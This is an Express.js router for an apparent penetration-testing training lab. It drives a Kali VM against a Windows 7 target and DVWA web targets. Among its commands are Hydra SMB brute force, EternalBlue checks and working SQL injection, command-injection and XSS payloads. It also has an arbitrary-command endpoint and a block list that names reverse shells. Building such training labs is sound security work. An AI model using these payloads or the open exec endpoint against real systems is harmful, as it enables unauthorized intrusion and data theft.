const express = require('express');
const crypto = require('crypto');
const {
  MACHINES,
  ATTACK_MODULES,
  KALI_CONFIG,
  WIN7_CONFIG,
  DVWA_TARGETS,
  WEB_TARGETS,
  WEB_TARGET_CATEGORIES,
  execOnKali,
  getAllStatuses,
  checkKaliOnline,
  checkWin7Online,
  checkDvwaOnline,
  getAllDvwaStatuses,
  checkWebTargetOnline,
  getAllWebTargetsStatuses,
  closeSshClient,
  readHistory,
  appendHistory,
} = require('../lib/vmLabs');

const router = express.Router();

// 正在运行的命令跟踪表：execId -> { abortController-like, cancelled }
// ssh2 的 stream.cancelSignal 不总是可靠，主要靠记录状态 + 用户端标识 cancelled
const runningExecs = new Map();

// GET /api/vm-labs/info —— 虚拟机基础信息（不含密码）
router.get('/info', (req, res) => {
  const machines = MACHINES.map((m) => ({
    id: m.id,
    name: m.name,
    role: m.role,
    os: m.os,
    icon: m.icon,
    host: m.host,
    port: m.port || null,
    username: m.username || null,
    directConnect: m.directConnect !== false,
  }));
  res.json({
    machines,
    attacker: machines.find((m) => m.role === 'attacker'),
    target: machines.find((m) => m.role === 'target'),
  });
});

// GET /api/vm-labs/status —— 实时在线状态 + 端口信息
router.get('/status', async (req, res) => {
  try {
    const status = await getAllStatuses();
    res.json(status);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/vm-labs/status/:machineId —— 单台机器状态
router.get('/status/:machineId', async (req, res) => {
  try {
    let result;
    if (req.params.machineId === 'kali') {
      result = { ...KALI_CONFIG, ...(await checkKaliOnline()) };
    } else if (req.params.machineId === 'win7') {
      result = { ...WIN7_CONFIG, ...(await checkWin7Online()) };
    } else {
      return res.status(404).json({ error: '未知的机器 ID，可选: kali, win7' });
    }
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/vm-labs/reconnect —— 断开并重连 SSH
router.post('/reconnect', async (req, res) => {
  try {
    closeSshClient('kali');
    const status = await checkKaliOnline();
    res.json({ reconnected: true, status });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== DVWA 靶场专属路由 =====

// GET /api/vm-labs/dvwa/info —— DVWA 基础信息（不暴露密码字段以外的敏感，只说默认 admin/password）
router.get('/dvwa/info', (req, res) => {
  const list = DVWA_TARGETS.map((d) => ({
    id: d.id,
    name: d.name,
    icon: d.icon,
    machine: d.machine,
    color: d.color,
    baseUrl: d.baseUrl,
    builtBy: d.builtBy,
    loginPage: `${d.baseUrl}${d.loginPage}`,
    setupPage: `${d.baseUrl}${d.setupPage}`,
    defaultCredsHint: `${d.defaultCreds?.user || 'admin'} / ${d.defaultCreds?.pass || 'password'}`,
  }));
  res.json({ count: list.length, targets: list });
});

// GET /api/vm-labs/dvwa/status —— 所有 DVWA 实时健康状态
router.get('/dvwa/status', async (req, res) => {
  try {
    const statuses = await getAllDvwaStatuses();
    res.json(statuses);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/vm-labs/dvwa/status/:targetId —— 单个 DVWA 状态
router.get('/dvwa/status/:targetId', async (req, res) => {
  const t = DVWA_TARGETS.find((d) => d.id === req.params.targetId);
  if (!t) return res.status(404).json({ error: `未知 DVWA targetId，可选: ${DVWA_TARGETS.map((d) => d.id).join(', ')}` });
  try {
    const s = await checkDvwaOnline(t);
    res.json(s);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== 通用 Web 靶场（15 个）专属路由 =====

// GET /api/vm-labs/web-targets/info —— 基础信息（元数据，不探测）
router.get('/web-targets/info', (req, res) => {
  const { category, status } = req.query;
  let list = WEB_TARGETS.slice();
  if (category) list = list.filter((t) => t.category === category);
  if (status) list = list.filter((t) => t.status === status);

  const infoList = list.map((t) => ({
    id: t.id,
    name: t.name,
    icon: t.icon,
    machine: t.machine,
    color: t.color,
    category: t.category,
    categoryLabel: t.categoryLabel,
    baseUrl: t.baseUrl,
    builtBy: t.builtBy,
    status: t.status,
    description: t.description,
    vulnerabilities: t.vulnerabilities || [],
    difficulty: t.difficulty || null,
    defaultCredsHint: t.defaultCreds
      ? `${t.defaultCreds.user || 'admin'} / ${t.defaultCreds.pass || 'password'}`
      : null,
    loginUrl: t.loginPage && t.baseUrl
      ? (t.baseUrl.endsWith('/') ? `${t.baseUrl}${t.loginPage}` : `${t.baseUrl}/${t.loginPage}`)
      : null,
    setupUrl: t.setupPage && t.baseUrl
      ? (t.baseUrl.endsWith('/') ? `${t.baseUrl}${t.setupPage}` : `${t.baseUrl}/${t.setupPage}`)
      : null,
    plannedNotice: t.plannedNotice || null,
  }));
  // 分组统计
  const counts = {
    total: WEB_TARGETS.length,
    ready: WEB_TARGETS.filter((t) => t.status === 'ready').length,
    planned: WEB_TARGETS.filter((t) => t.status === 'planned' || t.status === 'building').length,
    byCategory: {},
  };
  for (const cat of WEB_TARGET_CATEGORIES) {
    counts.byCategory[cat.key] = WEB_TARGETS.filter((t) => t.category === cat.key).length;
  }
  res.json({
    count: infoList.length,
    categories: WEB_TARGET_CATEGORIES,
    counts,
    targets: infoList,
  });
});

// GET /api/vm-labs/web-targets/status —— 所有靶场实时健康状态
router.get('/web-targets/status', async (req, res) => {
  try {
    const includePlanned = req.query.includePlanned !== 'false';
    const data = await getAllWebTargetsStatuses({ includePlanned });
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/vm-labs/web-targets/status/:targetId —— 单个靶场状态
router.get('/web-targets/status/:targetId', async (req, res) => {
  const t = WEB_TARGETS.find((x) => x.id === req.params.targetId);
  if (!t) return res.status(404).json({ error: `未知靶场 ID，可选: ${WEB_TARGETS.map((x) => x.id).join(', ')}` });
  try {
    const s = await checkWebTargetOnline(t);
    res.json(s);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/vm-labs/attack-modules —— 攻击模块清单（向导用）
router.get('/attack-modules', (req, res) => {
  res.json({
    modules: ATTACK_MODULES,
    targetIp: WIN7_CONFIG.host,
    attackerIp: KALI_CONFIG.host,
    dvwaTargets: DVWA_TARGETS.map((d) => ({
      id: d.id,
      name: d.name,
      icon: d.icon,
      baseUrl: d.baseUrl,
      machine: d.machine,
      color: d.color,
    })),
    // 新：所有 web targets 的精简清单
    webTargets: WEB_TARGETS.map((t) => ({
      id: t.id,
      name: t.name,
      icon: t.icon,
      baseUrl: t.baseUrl,
      machine: t.machine,
      color: t.color,
      category: t.category,
      status: t.status,
    })),
  });
});

// POST /api/vm-labs/exec —— 在 Kali 上执行任意命令（自定义终端 + 向导）
router.post('/exec', async (req, res) => {
  const { command, timeout, moduleId, stepId, label } = req.body || {};
  if (!command || typeof command !== 'string' || !command.trim()) {
    return res.status(400).json({ error: '请提供 command' });
  }
  if (command.length > 10_000) {
    return res.status(400).json({ error: '命令过长（>10000字符）' });
  }

  const execId = crypto.randomUUID();
  const startedAt = new Date().toISOString();
  const effectiveTimeout = Math.max(3_000, Math.min(10 * 60_000, Number(timeout) || 60_000));

  // 简单的安全基线：禁止交互式命令、端口转发、反向 shell 到外部网络
  // 允许 nmap / msfconsole -x / hydra 等合法攻击工具对目标 IP（内网）
  const blockedPatterns = [
    { re: /\bssh\s+.*\b-L\s*[0-9]/, reason: '禁止 SSH 本地端口转发 (-L)' },
    { re: /\bssh\s+.*\b-R\s*[0-9]/, reason: '禁止 SSH 远程端口转发 (-R)' },
    { re: /\bssh\s+.*\b-D\s*[0-9]/, reason: '禁止 SSH 动态转发 (-D)' },
    { re: /\bnc\s+.*-e\s/, reason: '禁止 nc -e 反向 shell（改用正向 payload/msf 模块）' },
  ];
  for (const b of blockedPatterns) {
    if (b.re.test(command)) {
      return res.status(400).json({ error: `安全限制：${b.reason}。` });
    }
  }

  runningExecs.set(execId, { command, startedAt });

  let historyEntry = null;
  try {
    const result = await execOnKali(command, effectiveTimeout);
    historyEntry = appendHistory({
      execId,
      startedAt,
      endedAt: new Date().toISOString(),
      command,
      moduleId: moduleId || null,
      stepId: stepId || null,
      label: label || null,
      exitCode: result.exitCode,
      success: result.exitCode === 0,
      outputChars: (result.stdout?.length || 0) + (result.stderr?.length || 0),
    });
    res.json({
      execId,
      command,
      stdout: result.stdout,
      stderr: result.stderr,
      exitCode: result.exitCode,
      startedAt,
      endedAt: historyEntry.endedAt,
      saved: true,
    });
  } catch (e) {
    appendHistory({
      execId,
      startedAt,
      endedAt: new Date().toISOString(),
      command,
      moduleId: moduleId || null,
      stepId: stepId || null,
      label: label || null,
      exitCode: -1,
      success: false,
      error: e.message,
    });
    res.status(500).json({ error: e.message, execId, command });
  } finally {
    runningExecs.delete(execId);
  }
});

// POST /api/vm-labs/attack/:moduleId/:stepId —— 按向导执行攻击步骤
router.post('/attack/:moduleId/:stepId', async (req, res) => {
  const { moduleId, stepId } = req.params;
  const mod = ATTACK_MODULES.find((m) => m.id === moduleId);
  if (!mod) return res.status(404).json({ error: '攻击模块不存在' });
  const step = mod.steps.find((s) => s.id === stepId);
  if (!step) return res.status(404).json({ error: '攻击步骤不存在' });

  // 危险步骤需要显式前端 confirm
  if (step.dangerous && !req.body?.iAcceptRisk) {
    return res.status(403).json({
      error: '此步骤标记为危险（可能蓝屏/破坏靶机），需要确认 iAcceptRisk=true',
      dangerous: true,
      stepId,
      name: step.name,
    });
  }

  const execId = crypto.randomUUID();
  const startedAt = new Date().toISOString();

  try {
    const result = await execOnKali(step.command, step.timeout || 60_000);
    appendHistory({
      execId,
      startedAt,
      endedAt: new Date().toISOString(),
      command: step.command,
      moduleId,
      stepId,
      label: step.name,
      exitCode: result.exitCode,
      success: result.exitCode === 0,
      outputChars: (result.stdout?.length || 0) + (result.stderr?.length || 0),
    });
    res.json({
      execId,
      moduleId,
      stepId,
      stepName: step.name,
      description: step.description,
      command: step.command,
      stdout: result.stdout,
      stderr: result.stderr,
      exitCode: result.exitCode,
      startedAt,
    });
  } catch (e) {
    res.status(500).json({ error: e.message, execId, moduleId, stepId });
  }
});

// GET /api/vm-labs/history —— 历史执行记录（倒序）
router.get('/history', (req, res) => {
  const limit = Math.min(200, Math.max(1, Number(req.query.limit) || 100));
  const list = readHistory().slice(0, limit);
  res.json({ count: list.length, limit, history: list });
});

// GET /api/vm-labs/history/:execId —— 单条历史记录详情（含输出）
router.get('/history/:execId', (req, res) => {
  const entry = readHistory().find((h) => h.execId === req.params.execId);
  if (!entry) return res.status(404).json({ error: '历史记录不存在' });
  res.json(entry);
});

// GET /api/vm-labs/quick-tools —— 常见快速命令（给前端"一键按钮"用）
router.get('/quick-tools', (req, res) => {
  const t = WIN7_CONFIG.host;
  res.json({
    tools: [
      {
        id: 'nmap-top',
        name: 'Nmap Top 1000 端口扫描',
        cmd: `nmap -Pn -n -sV -T4 ${t}`,
        timeout: 120_000,
        icon: '🔍',
        category: '侦察',
      },
      {
        id: 'nmap-vuln',
        name: 'Nmap NSE 漏洞脚本',
        cmd: `nmap -Pn -n --script vuln,smb-vuln-* -T4 ${t}`,
        timeout: 180_000,
        icon: '🐞',
        category: '扫描',
      },
      {
        id: 'ping',
        name: 'PING 连通性测试',
        cmd: `ping -c 4 -W 2 ${t}`,
        timeout: 10_000,
        icon: '📡',
        category: '基础',
      },
      {
        id: 'smb-enum',
        name: 'SMB 枚举 (enum4linux)',
        cmd: `which enum4linux-ng >/dev/null 2>&1 && enum4linux-ng -A ${t} 2>&1 | head -200 || enum4linux -a ${t} 2>&1 | head -200`,
        timeout: 120_000,
        icon: '🗂️',
        category: 'SMB',
      },
      {
        id: 'smb-shares',
        name: 'SMB 共享列表 (smbmap)',
        cmd: `smbmap -H ${t} 2>&1 | head -80`,
        timeout: 30_000,
        icon: '📁',
        category: 'SMB',
      },
      {
        id: 'hydra-smb-admin',
        name: 'Hydra SMB Administrator 爆破',
        cmd: `printf "123456\\npassword\\n12345678\\nqwerty\\nadmin\\n\\n" > /tmp/smbpass.txt; hydra -l administrator -P /tmp/smbpass.txt -t 2 smb://${t} 2>&1 | tail -30`,
        timeout: 60_000,
        icon: '🔑',
        category: '爆破',
      },
      {
        id: 'ms17-010-check',
        name: 'MS17-010 EternalBlue 检测',
        cmd: `nmap -Pn -n -p 445 --script smb-vuln-ms17-010 ${t}`,
        timeout: 30_000,
        icon: '💠',
        category: '漏洞检测',
      },
      {
        id: 'ms08-067-check',
        name: 'MS08-067 NetAPI 检测',
        cmd: `nmap -Pn -n -p 139,445 --script smb-vuln-ms08-067 ${t}`,
        timeout: 30_000,
        icon: '📛',
        category: '漏洞检测',
      },
      {
        id: 'whoami-linux',
        name: 'Kali 自身信息 (whoami/id)',
        cmd: `echo "用户:"; whoami; echo "ID:"; id; echo "IP:"; hostname -I 2>/dev/null || ip -4 addr show scope global | grep inet; echo "工具检查:"; which nmap msfconsole hydra sqlmap gobuster smbmap nikto enum4linux enum4linux-ng netdiscover crackmapexec 2>&1`,
        timeout: 15_000,
        icon: '🐉',
        category: '系统',
      },
      {
        id: 'arp-scan',
        name: 'ARP 存活主机 (nmap -sn)',
        cmd: `nmap -sn -T4 ${t}/24 2>&1 | tail -40`,
        timeout: 60_000,
        icon: '🛰️',
        category: '侦察',
      },
      // ========== DVWA 专项一键工具 ==========
      {
        id: 'dvwa-health',
        name: '[DVWA] 登录页健康检查',
        cmd: `for U in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do echo ">>> $U"; curl -sSk -o /dev/null -w "HTTP_CODE:%{http_code} TIME:%{time_total}s\\n" --max-time 6 "$U"; curl -sSk --max-time 6 "$U" | grep -ioE "dvwa|damn vulnerable" | head -1; done`,
        timeout: 20_000,
        icon: '🎯',
        category: 'DVWA',
      },
      {
        id: 'dvwa-default-login',
        name: '[DVWA] 默认账密登录测试',
        cmd: `for U in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do echo "========== $U =========="; C=/tmp/dvwa.cookies; curl -sSk -c $C -o /dev/null "\${U}login.php"; T=$(curl -sSk -b $C "\${U}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); R=$(curl -sSk -b $C -c $C -L -X POST -d "username=admin&password=password&Login=Login&user_token=\${T:-0}" -w "HTTP_CODE:%{http_code}\\n" "\${U}login.php" 2>&1); echo "$R" | grep -iE "Welcome|HTTP_CODE|index|dvwa"; done`,
        timeout: 30_000,
        icon: '🔓',
        category: 'DVWA',
      },
      {
        id: 'dvwa-sqli-quick',
        name: '[DVWA] SQL 注入 快速验证',
        cmd: `set +e; DVWA="${DVWA_TARGETS[0].baseUrl}"; C=/tmp/dvwa.cookies; curl -sSk -c $C -o /dev/null "\${DVWA}login.php"; T=$(curl -sSk -b $C "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); curl -sSk -b $C -c $C -X POST -d "username=admin&password=password&Login=Login&user_token=\${T:-0}" -o /dev/null "\${DVWA}login.php"; curl -sSk -b $C -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php"; echo "[-] 单引号错误测试:"; curl -sSk -b $C "\${DVWA}vulnerabilities/sqli/?id=1%27&Submit=Submit" | grep -iE "error|mysql|syntax" | head -3; echo "[-] UNION 取库信息:"; curl -sSk -b $C "\${DVWA}vulnerabilities/sqli/?id=0'+UNION+SELECT+1,concat('DB=',database(),'---USER=',current_user(),'---VER=',version())--+-&Submit=Submit" | grep -oE "DB=[^<]+" | head -3`,
        timeout: 40_000,
        icon: '🗃️',
        category: 'DVWA',
      },
      {
        id: 'dvwa-cmd-quick',
        name: '[DVWA] 命令注入 RCE 验证',
        cmd: `set +e; for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do echo "========== $DVWA =========="; C=/tmp/dvwa.cookies; curl -sSk -c $C -o /dev/null "\${DVWA}login.php"; T=$(curl -sSk -b $C "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); curl -sSk -b $C -c $C -X POST -d "username=admin&password=password&Login=Login&user_token=\${T:-0}" -o /dev/null "\${DVWA}login.php"; curl -sSk -b $C -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php"; PAYLOAD='127.0.0.1%3B+id%3B+whoami%3B+uname+-a%3B+pwd'; curl -sSk -b $C "\${DVWA}vulnerabilities/exec/?ip=$PAYLOAD&Submit=Submit" 2>&1 | grep -vE "^<|^\\s*$" | tail -12; done`,
        timeout: 40_000,
        icon: '🧨',
        category: 'DVWA',
      },
      {
        id: 'dvwa-xss-quick',
        name: '[DVWA] XSS 反射/存储验证',
        cmd: `set +e; DVWA="${DVWA_TARGETS[0].baseUrl}"; C=/tmp/dvwa.cookies; curl -sSk -c $C -o /dev/null "\${DVWA}login.php"; T=$(curl -sSk -b $C "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); curl -sSk -b $C -c $C -X POST -d "username=admin&password=password&Login=Login&user_token=\${T:-0}" -o /dev/null "\${DVWA}login.php"; curl -sSk -b $C -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php"; echo "[Reflected XSS]"; curl -sSk -b $C "\${DVWA}vulnerabilities/xss_r/?name=%3Csvg+onload=alert('CISP-XSS')%3E" | grep -oE "onload=alert\\('CISP-XSS'\\)" | head -1; echo "[Stored XSS]: Posting..."; curl -sSk -b $C -X POST -d "txtName=CISP-Name&mtxMessage=%3Cimg+src=x+onerror=alert(123456)%3E&btnSign=Sign+Guestbook" -o /dev/null "\${DVWA}vulnerabilities/xss_s/"; curl -sSk -b $C "\${DVWA}vulnerabilities/xss_s/" | grep -oE "onerror=alert\\(123456\\)" | head -1`,
        timeout: 35_000,
        icon: '🧪',
        category: 'DVWA',
      },
    ],
  });
});

module.exports = router;
